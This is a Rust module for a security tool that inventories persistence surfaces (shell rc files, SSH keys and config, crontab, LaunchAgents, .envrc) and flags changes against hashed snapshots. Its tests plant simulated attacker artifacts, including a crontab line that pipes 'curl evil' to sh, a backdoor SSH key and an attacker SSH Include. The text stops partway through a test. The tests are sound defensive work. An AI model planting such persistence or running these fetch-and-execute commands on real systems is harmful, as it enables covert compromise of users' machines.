//! Persistence-mechanism inventory + state-change detection (M9 ch2).
//!
//! Inventories well-known *persistence surfaces* (shell rc/profile files,
//! `~/.ssh/{authorized_keys,config}`, `~/.gitconfig`, `~/.npmrc`, the crontab,
//! systemd-user units, macOS LaunchAgents, login items, `.envrc` ancestry, the
//! git global hooks path), recording a sha256 + size each. `diff` compares the
//! live state against a recorded snapshot to surface *changes*.
//!
//! Key invariants:
//! * Testable entry point is [`scan_with_root`] (home + optional cwd); [`scan`]
//!   resolves the real home/cwd. Tests use a `tempfile::tempdir()` and NEVER
//!   mutate `HOME`/env (libc data race, PR #125).
//! * The 6 rules fire on DIFF, not scan — `scan` emits no RuleId. They are
//!   state-change rules (no PATTERN_TABLE entry; in `EXTERNALLY_TRIGGERED_RULES`).
//! * `crontab -l` / login-items `osascript` run via [`crate::util::run_shell_with_timeout`]
//!   with a 1.5s budget; a non-zero exit ("no crontab") counts as empty, not an error.
//! * The diff reports ADDED LINES ONLY (never removed/full content), each run
//!   through [`crate::redact::redact`] so a new key/token never leaks into a finding.
//! * The on-disk snapshot ([`PersistenceSnapshot`]) is `0600` and stores NO
//!   cleartext — only `sha256` + `size` + per-line hashes. Added lines are
//!   recomputed at diff time from the CURRENT file (legitimately in hand then).

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::util::{run_shell_with_timeout, ShellTimeoutOutcome};
use crate::verdict::{RuleId, Severity};

/// Budget for each persistence shell-out (`crontab -l`, login-items `osascript`).
const SHELL_OUT_TIMEOUT: Duration = Duration::from_millis(1500);

/// The class of persistence surface; determines which [`RuleId`] a change fires.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PersistenceKind {
    /// Shell rc / profile file → [`RuleId::PersistenceShellRcModified`].
    ShellRc,
    /// `~/.ssh/authorized_keys` → [`RuleId::PersistenceAuthorizedKeysNewEntry`].
    AuthorizedKeys,
    /// `~/.ssh/config`; an added `Include` → [`RuleId::PersistenceSshConfigInclude`].
    SshConfig,
    /// The user crontab → [`RuleId::PersistenceCrontabModified`].
    Crontab,
    /// systemd-user unit or LaunchAgent plist → [`RuleId::PersistenceLaunchAgentAdded`].
    LaunchAgent,
    /// A `.envrc` in the cwd ancestry → [`RuleId::PersistenceDirenvNewEnvrc`].
    Direnv,
    /// Inventory-only context (gitconfig, npmrc, git hooks path, login items):
    /// tracked in the snapshot but fires none of the six rules.
    Other,
}

impl PersistenceKind {
    pub fn as_str(self) -> &'static str {
        match self {
            PersistenceKind::ShellRc => "shell_rc",
            PersistenceKind::AuthorizedKeys => "authorized_keys",
            PersistenceKind::SshConfig => "ssh_config",
            PersistenceKind::Crontab => "crontab",
            PersistenceKind::LaunchAgent => "launch_agent",
            PersistenceKind::Direnv => "direnv",
            PersistenceKind::Other => "other",
        }
    }
}

/// One inventoried persistence surface: key, kind, location, and content
/// fingerprint (`sha256` + `size`). A non-existent surface has `present = false`,
/// the empty-string hash, and empty content, so a later appearance is detectable.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceEntry {
    /// Stable snapshot map key (e.g. `shell_rc:.zshrc`, `launch_agent:com.foo.plist`).
    pub key: String,
    /// The class of surface (drives the rule a change fires).
    pub kind: PersistenceKind,
    /// Human-readable location (a path, or a label like `crontab -l`).
    pub location: String,
    /// `true` when the surface currently exists / produced output.
    pub present: bool,
    /// Hex sha256 of `content`.
    pub sha256: String,
    /// Byte length of `content`.
    pub size: usize,
    /// Raw content (UTF-8 lossy), IN MEMORY only for the current scan to recompute
    /// added lines. NEVER serialized (the snapshot keeps cleartext out — see module doc).
    #[serde(skip)]
    pub content: String,
}

/// A point-in-time snapshot of every watched surface, keyed by
/// [`PersistenceEntry::key`]. Persisted at `state_dir()/persistence_snapshot.json`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PersistenceSnapshot {
    /// Schema version (for forward-compatible migrations).
    #[serde(default = "default_schema_version")]
    pub schema_version: u32,
    #[serde(default)]
    pub entries: BTreeMap<String, SnapshotEntry>,
}

fn default_schema_version() -> u32 {
    1
}

/// The persisted per-surface record: fingerprint + per-line hashes, NO cleartext.
/// `line_hashes` (16-char SHA-256 prefix of each non-empty line) lets `diff` find
/// *added* lines from the current file without ever persisting the raw bytes.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SnapshotEntry {
    pub kind: PersistenceKind,
    pub location: String,
    pub present: bool,
    pub sha256: String,
    pub size: usize,
    /// 16-char SHA-256 prefix of each non-empty line, order-preserving. Empty for
    /// surfaces with no line content.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub line_hashes: Vec<String>,
}

impl PersistenceSnapshot {
    /// Build a snapshot from an inventory (per-line hashes, never cleartext).
    pub fn from_entries(entries: &[PersistenceEntry]) -> Self {
        let mut map = BTreeMap::new();
        for e in entries {
            map.insert(
                e.key.clone(),
                SnapshotEntry {
                    kind: e.kind,
                    location: e.location.clone(),
                    present: e.present,
                    sha256: e.sha256.clone(),
                    size: e.size,
                    line_hashes: line_hashes(&e.content),
                },
            );
        }
        PersistenceSnapshot {
            schema_version: 1,
            entries: map,
        }
    }
}

/// A single state-change finding emitted by [`diff_against_snapshot`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceFinding {
    pub rule_id: RuleId,
    pub severity: Severity,
    pub kind: PersistenceKind,
    pub location: String,
    /// Short description of *what* changed (e.g. `"new unit appeared"`).
    pub change: String,
    /// Added lines (new content minus snapshot), ALREADY credential-redacted.
    pub added_lines: Vec<String>,
}

impl PersistenceFinding {
    /// `true` when High or Critical (drives diff/watch exit 1).
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

/// Inventory every watched surface for the real home dir + cwd. Returns an empty
/// inventory if home can't be resolved (the `.envrc` walk still runs against cwd).
pub fn scan() -> Vec<PersistenceEntry> {
    let home = home::home_dir();
    let cwd = std::env::current_dir().ok();
    match home {
        Some(h) => scan_with_root(&h, cwd.as_deref()),
        None => match cwd {
            Some(c) => collect_envrc_ancestry(&c),
            None => Vec::new(),
        },
    }
}

/// Testable entry point: inventory every surface under `home` plus an optional
/// `cwd` for the `.envrc` walk. Tests pass a `tempfile::tempdir()` here.
pub fn scan_with_root(home: &Path, cwd: Option<&Path>) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();

    // Shell rc / profile files.
    for rel in SHELL_RC_FILES {
        let path = home.join(rel);
        entries.push(file_entry(
            &format!("shell_rc:{rel}"),
            PersistenceKind::ShellRc,
            &path,
        ));
    }
    // PowerShell profiles (only the common paths).
    for rel in POWERSHELL_PROFILES {
        let path = home.join(rel);
        if path.is_file() {
            entries.push(file_entry(
                &format!("shell_rc:{rel}"),
                PersistenceKind::ShellRc,
                &path,
            ));
        }
    }

    // SSH authorized_keys + config.
    entries.push(file_entry(
        "authorized_keys",
        PersistenceKind::AuthorizedKeys,
        &home.join(".ssh").join("authorized_keys"),
    ));
    entries.push(file_entry(
        "ssh_config",
        PersistenceKind::SshConfig,
        &home.join(".ssh").join("config"),
    ));

    // Inventory-only context surfaces (no dedicated rule): gitconfig, npmrc.
    entries.push(file_entry(
        "other:.gitconfig",
        PersistenceKind::Other,
        &home.join(".gitconfig"),
    ));
    entries.push(file_entry(
        "other:.npmrc",
        PersistenceKind::Other,
        &home.join(".npmrc"),
    ));

    // Crontab (shell-out, timeout-bounded, absence == empty).
    entries.push(crontab_entry());

    // systemd-user units.
    entries.extend(launch_agent_dir(
        &home.join(".config").join("systemd").join("user"),
        "service",
    ));
    // macOS LaunchAgents.
    entries.extend(launch_agent_dir(
        &home.join("Library").join("LaunchAgents"),
        "plist",
    ));

    // Login items (macOS osascript); absent entry on non-macOS.
    entries.push(login_items_entry());

    // git global hooks path (core.hooksPath), inventory-only.
    if let Some(e) = git_hooks_path_entry(home) {
        entries.push(e);
    }

    // `.envrc` in the cwd ancestry.
    if let Some(c) = cwd {
        entries.extend(collect_envrc_ancestry(c));
    }

    entries
}

/// Shell rc / profile files inspected under `~`.
const SHELL_RC_FILES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".zshrc",
    ".zprofile",
    ".profile",
    ".config/fish/config.fish",
];

/// PowerShell profile paths (only added when present — these vary by host).
const POWERSHELL_PROFILES: &[&str] = &[
    ".config/powershell/Microsoft.PowerShell_profile.ps1",
    "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
    "Documents/WindowsPowerShell/Microsoft.PowerShell_profile.ps1",
];

/// Build a [`PersistenceEntry`] for a file path. A missing/unreadable file
/// yields an absent entry (empty-string hash) so a later appearance is detectable.
fn file_entry(key: &str, kind: PersistenceKind, path: &Path) -> PersistenceEntry {
    let (present, content) = match read_text_if_file(path) {
        Some(c) => (true, c),
        None => (false, String::new()),
    };
    PersistenceEntry {
        key: key.to_string(),
        kind,
        location: path.display().to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory the user crontab via `crontab -l`; a non-zero exit ("no crontab")
/// counts as an EMPTY crontab, not an error.
fn crontab_entry() -> PersistenceEntry {
    let content = match run_shell_with_timeout(
        "crontab",
        &["-l"],
        SHELL_OUT_TIMEOUT,
        Duration::from_millis(25),
        std::process::Stdio::null(),
    ) {
        ShellTimeoutOutcome::Completed { status, stdout } if status.success() => {
            String::from_utf8_lossy(&stdout).into_owned()
        }
        // Non-zero exit / NotFound / timeout / spawn error → empty crontab.
        _ => String::new(),
    };
    let present = !content.trim().is_empty();
    PersistenceEntry {
        key: "crontab".to_string(),
        kind: PersistenceKind::Crontab,
        location: "crontab -l".to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory each `.{ext}` file in a launch-agent / systemd-user dir as its own
/// entry keyed by filename (so an added unit is a new key). Files are HASHED, not
/// parsed — a content hash avoids a `plutil` shell-out per file.
fn launch_agent_dir(dir: &Path, ext: &str) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();
    let read = match std::fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return entries,
    };
    for entry in read.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let name = match path.file_name().and_then(|n| n.to_str()) {
            Some(n) => n.to_string(),
            None => continue,
        };
        if !name.to_ascii_lowercase().ends_with(&format!(".{ext}")) {
            continue;
        }
        // Read raw bytes (plists may be binary); hash for change-detection.
        let bytes = std::fs::read(&path).unwrap_or_default();
        // UTF-8-lossy copy for added-line diffing of XML plists / systemd units.
        let content = String::from_utf8_lossy(&bytes).into_owned();
        entries.push(PersistenceEntry {
            key: format!("launch_agent:{name}"),
            kind: PersistenceKind::LaunchAgent,
            location: path.display().to_string(),
            present: true,
            sha256: sha256_hex(&bytes),
            size: bytes.len(),
            content,
        });
    }
    entries
}

/// Inventory macOS login items via `osascript`; an absent entry on non-macOS
/// (or when `osascript` is absent / errors / times out).
fn login_items_entry() -> PersistenceEntry {
    let content = match run_shell_with_timeout(
        "osascript",
        &[
            "-e",
            "tell application \"System Events\" to get the name of every login item",
        ],
        SHELL_OUT_TIMEOUT,
        Duration::from_millis(25),
        std::process::Stdio::null(),
    ) {
        ShellTimeoutOutcome::Completed { status, stdout } if status.success() => {
            String::from_utf8_lossy(&stdout).into_owned()
        }
        _ => String::new(),
    };
    let present = !content.trim().is_empty();
    PersistenceEntry {
        key: "login_items".to_string(),
        kind: PersistenceKind::Other,
        location: "login items".to_string(),
        present,
        sha256: sha256_hex(content.as_bytes()),
        size: content.len(),
        content,
    }
}

/// Inventory the git global hooks path (`core.hooksPath`) from `~/.gitconfig`
/// (inventory-only); `None` when unset.
fn git_hooks_path_entry(home: &Path) -> Option<PersistenceEntry> {
    let gitconfig = read_text_if_file(&home.join(".gitconfig"))?;
    let hooks_path = parse_git_hooks_path(&gitconfig)?;
    Some(PersistenceEntry {
        key: "git_hooks_path".to_string(),
        kind: PersistenceKind::Other,
        location: format!("git core.hooksPath = {hooks_path}"),
        present: true,
        sha256: sha256_hex(hooks_path.as_bytes()),
        size: hooks_path.len(),
        content: hooks_path,
    })
}

/// Extract `core.hooksPath` from a gitconfig body (both the `[core]` section
/// form and the dotted `core.hooksPath = …` form).
fn parse_git_hooks_path(contents: &str) -> Option<String> {
    let mut in_core = false;
    for raw in contents.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if line.starts_with('[') {
            let header = line.trim_start_matches('[').trim_end_matches(']');
            let section = header
                .split_whitespace()
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            in_core = section == "core";
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            let key_lc = key.trim().to_ascii_lowercase();
            let value = value.trim().trim_matches('"').trim_matches('\'').trim();
            if value.is_empty() {
                continue;
            }
            if key_lc == "core.hookspath" || (in_core && key_lc == "hookspath") {
                return Some(value.to_string());
            }
        }
    }
    None
}

/// Walk from `cwd` to the FS root collecting every `.envrc`, each keyed by its
/// absolute path so a newly-created one in the ancestry is detectable.
fn collect_envrc_ancestry(cwd: &Path) -> Vec<PersistenceEntry> {
    let mut entries = Vec::new();
    let mut cur = Some(cwd);
    // Bound the walk to avoid pathological symlink loops.
    let mut budget: usize = 256;
    while let Some(dir) = cur {
        if budget == 0 {
            break;
        }
        budget -= 1;
        let envrc = dir.join(".envrc");
        if envrc.is_file() {
            if let Some(content) = read_text_if_file(&envrc) {
                entries.push(PersistenceEntry {
                    key: format!("direnv:{}", envrc.display()),
                    kind: PersistenceKind::Direnv,
                    location: envrc.display().to_string(),
                    present: true,
                    sha256: sha256_hex(content.as_bytes()),
                    size: content.len(),
                    content,
                });
            }
        }
        cur = dir.parent();
    }
    entries
}

/// Compare the live inventory under `home`/`cwd` against `snapshot`, emitting a
/// [`PersistenceFinding`] per changed surface (added lines only, redacted).
pub fn diff_against_snapshot(
    home: &Path,
    cwd: Option<&Path>,
    snapshot: &PersistenceSnapshot,
) -> Vec<PersistenceFinding> {
    let current = scan_with_root(home, cwd);
    diff_entries(&current, snapshot)
}

/// Core diff (shared by [`diff_against_snapshot`] and the CLI): compare a
/// `current` inventory against `snapshot`.
pub fn diff_entries(
    current: &[PersistenceEntry],
    snapshot: &PersistenceSnapshot,
) -> Vec<PersistenceFinding> {
    let mut findings = Vec::new();

    for entry in current {
        let prev = snapshot.entries.get(&entry.key);

        // The prior content is gone (snapshot stores only hashes), so diff
        // against the prior per-line hash set.
        let (changed, prev_line_hashes, prev_present): (bool, &[String], bool) = match prev {
            Some(p) => (
                p.sha256 != entry.sha256,
                p.line_hashes.as_slice(),
                p.present,
            ),
            // No prior record: a present surface is a new appearance; an absent
            // one is not a change (first-ever scan of an empty surface).
            None => (entry.present, &[], false),
        };

        if !changed {
            continue;
        }

        // Map kind → rule + severity; `Other` never fires.
        let (rule_id, severity) = match entry.kind {
            PersistenceKind::ShellRc => (RuleId::PersistenceShellRcModified, Severity::Medium),
            PersistenceKind::AuthorizedKeys => {
                (RuleId::PersistenceAuthorizedKeysNewEntry, Severity::High)
            }
            PersistenceKind::Crontab => (RuleId::PersistenceCrontabModified, Severity::Medium),
            PersistenceKind::LaunchAgent => (RuleId::PersistenceLaunchAgentAdded, Severity::High),
            PersistenceKind::SshConfig => {
                // Fire only when the change ADDS an `Include` (a `Host` edit shouldn't).
                if !added_includes(prev_line_hashes, &entry.content) {
                    continue;
                }
                (RuleId::PersistenceSshConfigInclude, Severity::Medium)
            }
            PersistenceKind::Direnv => (RuleId::PersistenceDirenvNewEnvrc, Severity::Medium),
            PersistenceKind::Other => continue,
        };

        let added = added_lines_redacted(prev_line_hashes, &entry.content);
        let change = describe_change(entry.kind, prev_present, entry.present);

        findings.push(PersistenceFinding {
            rule_id,
            severity,
            kind: entry.kind,
            location: entry.location.clone(),
            change,
            added_lines: added,
        });
    }

    findings
}

/// One-line human description of the change for a surface kind.
fn describe_change(kind: PersistenceKind, prev_present: bool, now_present: bool) -> String {
    match (kind, prev_present, now_present) {
        (PersistenceKind::AuthorizedKeys, _, _) => "authorized key(s) added".to_string(),
        (PersistenceKind::LaunchAgent, false, true) => "new unit appeared".to_string(),
        (PersistenceKind::LaunchAgent, true, true) => "unit modified".to_string(),
        (PersistenceKind::Direnv, false, true) => "new .envrc appeared".to_string(),
        (PersistenceKind::SshConfig, _, _) => "Include directive added".to_string(),
        (PersistenceKind::Crontab, false, true) => "crontab created".to_string(),
        (PersistenceKind::Crontab, _, _) => "crontab modified".to_string(),
        (_, false, true) => "file created".to_string(),
        (_, true, false) => "file removed".to_string(),
        _ => "content modified".to_string(),
    }
}

/// Lines in `new_content` whose per-line hash is NOT in `prev_line_hashes`,
/// credential-redacted, order-preserving. Membership is by hash (the snapshot
/// stores no cleartext) — the secret-at-rest contract.
fn added_lines_redacted(prev_line_hashes: &[String], new_content: &str) -> Vec<String> {
    use std::collections::HashSet;
    let prev: HashSet<&str> = prev_line_hashes.iter().map(String::as_str).collect();
    let mut out = Vec::new();
    for line in new_content.lines() {
        if line.trim().is_empty() {
            continue;
        }
        if prev.contains(line_hash(line).as_str()) {
            continue;
        }
        out.push(crate::redact::redact(line));
    }
    out
}

/// `true` when `new_content` has an `Include` RAW line whose hash is absent from
/// `prev_line_hashes`. The hash MUST be over the same raw (untrimmed) line that
/// [`line_hashes`] persists, so an unchanged indented `  Include …` doesn't look added.
fn added_includes(prev_line_hashes: &[String], new_content: &str) -> bool {
    use std::collections::HashSet;
    let prev: HashSet<&str> = prev_line_hashes.iter().map(String::as_str).collect();
    new_content
        .lines()
        .filter(|raw| line_is_include(raw))
        .any(|raw| !prev.contains(line_hash(raw).as_str()))
}

/// `true` when a RAW config line is an `Include`/`IncludeIf` directive.
fn line_is_include(raw: &str) -> bool {
    let line = raw.trim();
    if line.is_empty() || line.starts_with('#') {
        return false;
    }
    let keyword = line.split(char::is_whitespace).next().unwrap_or("");
    keyword.eq_ignore_ascii_case("include")
}

/// 16-char SHA-256 prefix of one content line (64 bits is ample here, and stores
/// nothing recoverable).
fn line_hash(line: &str) -> String {
    sha256_hex(line.as_bytes()).chars().take(16).collect()
}

/// Per-line hashes of every NON-EMPTY line (RAW, untrimmed, order-preserving) —
/// what the snapshot persists in place of cleartext.
fn line_hashes(content: &str) -> Vec<String> {
    content
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(line_hash)
        .collect()
}

/// Hex sha256 of a byte slice.
fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(bytes);
    let mut s = String::with_capacity(64);
    for b in digest {
        use std::fmt::Write as _;
        let _ = write!(s, "{b:02x}");
    }
    s
}

/// Read a path as UTF-8 text only when it is a regular file; `None` otherwise.
fn read_text_if_file(path: &Path) -> Option<String> {
    if !path.is_file() {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Default on-disk snapshot path: `state_dir()/persistence_snapshot.json`.
pub fn snapshot_path() -> Option<PathBuf> {
    crate::policy::state_dir().map(|d| d.join("persistence_snapshot.json"))
}

/// Load a snapshot from `path`; an empty (default) snapshot when absent or
/// unparseable (a missing snapshot means "no baseline yet", not an error).
pub fn load_snapshot(path: &Path) -> PersistenceSnapshot {
    match std::fs::read_to_string(path) {
        Ok(s) => serde_json::from_str(&s).unwrap_or_default(),
        Err(_) => PersistenceSnapshot::default(),
    }
}

/// Persist `snapshot` to `path` (creating the parent dir), `0600` AT OPEN TIME
/// (no umask race) and ATOMICALLY (sibling temp + rename). The tracked-surface
/// set is mildly sensitive, so the 0600 discipline applies; perms failures propagate.
pub fn save_snapshot(path: &Path, snapshot: &PersistenceSnapshot) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let json = serde_json::to_string_pretty(snapshot)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;

    // Sibling temp + rename so a partial write can't leave a corrupt snapshot.
    let tmp = path.with_extension("json.tmp");

    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(&tmp)?;
    use std::io::Write as _;
    f.write_all(json.as_bytes())?;
    f.flush()?;
    // `OpenOptions::mode` only applies on file *creation* — if the temp file
    // already existed with looser perms, tighten it before the rename.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600))?;
    }
    drop(f);

    std::fs::rename(&tmp, path)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(findings: &[PersistenceFinding]) -> Vec<RuleId> {
        findings.iter().map(|f| f.rule_id).collect()
    }

    fn snapshot_then(home: &Path, cwd: Option<&Path>) -> PersistenceSnapshot {
        let entries = scan_with_root(home, cwd);
        PersistenceSnapshot::from_entries(&entries)
    }

    #[test]
    fn scan_reports_sha256_for_existing_rc() {
        let home = tempdir().unwrap();
        std::fs::write(
            home.path().join(".zshrc"),
            b"export PATH=$PATH:/usr/local/bin\n",
        )
        .unwrap();

        let entries = scan_with_root(home.path(), None);
        let zshrc = entries
            .iter()
            .find(|e| e.key == "shell_rc:.zshrc")
            .expect("expected .zshrc entry");
        assert!(zshrc.present);
        assert_eq!(zshrc.sha256.len(), 64);
        assert_ne!(zshrc.sha256, sha256_hex(b""));
    }

    #[test]
    fn shell_rc_modified_fires_medium() {
        let home = tempdir().unwrap();
        let zshrc = home.path().join(".zshrc");
        std::fs::write(&zshrc, b"export PATH=$PATH:/usr/local/bin\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Modify the rc file: append a sourced payload.
        std::fs::write(
            &zshrc,
            b"export PATH=$PATH:/usr/local/bin\nsource ~/.cache/evil.sh\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceShellRcModified)
            .expect("expected shell-rc-modified finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(
            f.added_lines.iter().any(|l| l.contains("evil.sh")),
            "added lines should include the new source line, got {:?}",
            f.added_lines
        );
    }

    #[test]
    fn unchanged_rc_does_not_fire() {
        let home = tempdir().unwrap();
        std::fs::write(home.path().join(".bashrc"), b"alias ll='ls -la'\n").unwrap();

        let snap = snapshot_then(home.path(), None);
        // No mutation.
        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(
            findings.is_empty(),
            "no change → no findings, got {findings:?}"
        );
    }

    #[test]
    fn authorized_keys_new_entry_fires_high() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let ak = ssh.join("authorized_keys");
        std::fs::write(&ak, b"ssh-ed25519 AAAAExistingKey user@host\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Append an attacker key.
        std::fs::write(
            &ak,
            b"ssh-ed25519 AAAAExistingKey user@host\nssh-rsa AAAABackdoorKey attacker@evil\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceAuthorizedKeysNewEntry)
            .expect("expected authorized_keys finding");
        assert!(f.is_high());
        assert!(f.added_lines.iter().any(|l| l.contains("AAAABackdoorKey")));
        // The pre-existing key must NOT be reported as added.
        assert!(!f.added_lines.iter().any(|l| l.contains("AAAAExistingKey")));
    }

    #[test]
    fn crontab_modified_fires_medium_via_entries() {
        // Crontab content comes from a shell-out; drive the diff with synthesized entries.
        let old = vec![PersistenceEntry {
            key: "crontab".to_string(),
            kind: PersistenceKind::Crontab,
            location: "crontab -l".to_string(),
            present: true,
            sha256: sha256_hex(b"0 * * * * backup.sh\n"),
            size: 20,
            content: "0 * * * * backup.sh\n".to_string(),
        }];
        let snap = PersistenceSnapshot::from_entries(&old);

        let new = vec![PersistenceEntry {
            key: "crontab".to_string(),
            kind: PersistenceKind::Crontab,
            location: "crontab -l".to_string(),
            present: true,
            content: "0 * * * * backup.sh\n* * * * * curl evil|sh\n".to_string(),
            sha256: sha256_hex(b"0 * * * * backup.sh\n* * * * * curl evil|sh\n"),
            size: 44,
        }];

        let findings = diff_entries(&new, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceCrontabModified)
            .expect("expected crontab-modified finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.added_lines.iter().any(|l| l.contains("curl evil")));
    }

    #[test]
    fn launch_agent_added_fires_high() {
        let home = tempdir().unwrap();
        // Snapshot with NO launch agents.
        let snap = snapshot_then(home.path(), None);

        // Add a LaunchAgent plist.
        let la = home.path().join("Library").join("LaunchAgents");
        std::fs::create_dir_all(&la).unwrap();
        std::fs::write(
            la.join("com.evil.persist.plist"),
            b"<?xml version=\"1.0\"?>\n<plist><dict><key>Label</key><string>com.evil.persist</string></dict></plist>\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceLaunchAgentAdded)
            .expect("expected launch-agent-added finding");
        assert!(f.is_high());
        assert_eq!(f.change, "new unit appeared");
    }

    #[test]
    fn ssh_config_include_added_fires_medium() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let cfg = ssh.join("config");
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 60\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Add an Include directive.
        std::fs::write(
            &cfg,
            b"Host *\n  ServerAliveInterval 60\nInclude /tmp/attacker_config\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceSshConfigInclude)
            .expect("expected ssh-config-include finding");
        assert_eq!(f.severity, Severity::Medium);
        assert!(f.added_lines.iter().any(|l| l.contains("Include")));
    }

    #[test]
    fn ssh_config_indented_include_unchanged_does_not_fire() {
        // An unchanged indented `  Include …` must not look "added" — the
        // trimmed-vs-raw hash mismatch was a real bug.
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let cfg = ssh.join("config");
        std::fs::write(&cfg, b"Host *\n  Include ~/.ssh/config.d/work\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Change an unrelated option; the indented Include is untouched → no fire.
        std::fs::write(
            &cfg,
            b"Host *\n  Include ~/.ssh/config.d/work\n  ServerAliveInterval 60\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(
            !rule_ids(&findings).contains(&RuleId::PersistenceSshConfigInclude),
            "an unchanged indented Include must not fire, got {findings:?}"
        );
    }

    #[test]
    fn ssh_config_non_include_edit_does_not_fire() {
        let home = tempdir().unwrap();
        let ssh = home.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let cfg = ssh.join("config");
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 60\n").unwrap();

        let snap = snapshot_then(home.path(), None);

        // Change an unrelated option — must NOT fire the Include rule.
        std::fs::write(&cfg, b"Host *\n  ServerAliveInterval 120\n").unwrap();

        let findings = diff_against_snapshot(home.path(), None, &snap);
        assert!(
            !rule_ids(&findings).contains(&RuleId::PersistenceSshConfigInclude),
            "a non-Include edit must not fire the SSH-config rule, got {findings:?}"
        );
    }

    #[test]
    fn direnv_new_envrc_fires_medium() {
        let home = tempdir().unwrap();
        let project = tempdir().unwrap();
        // Snapshot with no .envrc in the project.
        let snap = snapshot_then(home.path(), Some(project.path()));

        // Create a new .envrc.
        std::fs::write(
            project.path().join(".envrc"),
            b"export AWS_PROFILE=prod\nexport SECRET=abc\n",
        )
        .unwrap();

        let findings = diff_against_snapshot(home.path(), Some(project.path()), &snap);
        let f = findings
            .iter()
            .find(|f| f.rule_id == RuleId::PersistenceDirenvNewEnvrc)
            .expect("expected direnv finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.change, "new .envrc appeared");
    }

    #[test]
    fn added_lines_are_credential_redacted() {
        // A sourced AWS key must be redacted in added_lines; the prior content
        // is only its per-line hashes, yet the diff still finds the new line.
        let old = "export PATH=/usr/bin\n";
        let new = "export PATH=/usr/bin\nexport AWS_KEY=AKIAIOSFODNN7EXAMPLE\n";
        let added = added_lines_redacted(&line_hashes(old), new);
        assert_eq!(added.len(), 1);
        assert!(
            !added[0].contains("AKIAIOSFODNN7EXAMPLE"),
            "credential must be redacted, got {:?}",
            added
        );
        assert!(added[0].contains("[REDACTED"));
    }

    #[test]
    fn snapshot_persists_no_cleartext_only_hashes() {
        // The serialized snapshot must NOT contain raw rc-file bytes (secret-at-rest).
        let home = tempdir().unwrap();
        std::fs::write(
            home.path().join(".zshrc"),
            b"export AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\n",
        )
        .unwrap();
        let entries = scan_with_root(home.path(), None);
        let snap = PersistenceSnapshot::from_entries(&entries);
        let json = serde_json::to_string(&snap).unwrap();
        assert!(
            !json.contains("AKIAIOSFODNN7EXAMPLE"),
            "snapshot must not persist raw rc content, got {json}"
        );
        // But the per-line hashes ARE present so the diff still works.
        assert!(json.contains("line_hashes"), "{json}");
    }

    #[cfg(unix)]
    #[test]
    fn save_snapshot_writes_0600() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempdir().unwrap();
        let path = dir.path().join("persistence_snapshot.json");
        // Pre-create at a loose mode to prove the re-baseline path tightens it.
